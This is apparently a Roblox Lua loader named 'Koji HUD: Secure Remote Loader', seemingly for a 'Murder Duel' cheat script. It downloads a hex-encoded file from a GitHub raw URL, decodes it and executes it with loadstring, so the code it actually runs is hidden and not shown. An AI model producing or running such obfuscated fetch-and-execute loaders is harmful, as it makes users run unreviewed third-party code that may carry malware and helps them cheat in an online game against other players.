-- [[ Koji HUD: Secure Remote Loader ]]
local data_url = "https://raw.githubusercontent.com/jiop9981qwer-byte/MurderDuelScript/refs/heads/main/data.txt"

local function from_hex(hex)
    local str = ""
    for i = 1, #hex, 2 do
        str = str .. string.char(tonumber(hex:sub(i, i+1), 16))
    end
    return str
end

local success, hex_data = pcall(function()
    return game:HttpGet(data_url)
end)

if success and hex_data then
    -- Hex 데이터에서 공백이나 줄바꿈 제거
    hex_data = hex_data:gsub("%s+", "")
    local source = from_hex(hex_data)
    local func, err = loadstring(source)
    
    if func then
        task.spawn(function()
            local s, e = pcall(func)
            if not s then warn("Execution Error: " .. tostring(e)) end
        end)
    else
        warn("Syntax Error: " .. tostring(err))
    end
else
    warn("Failed to load data from GitHub.")
end
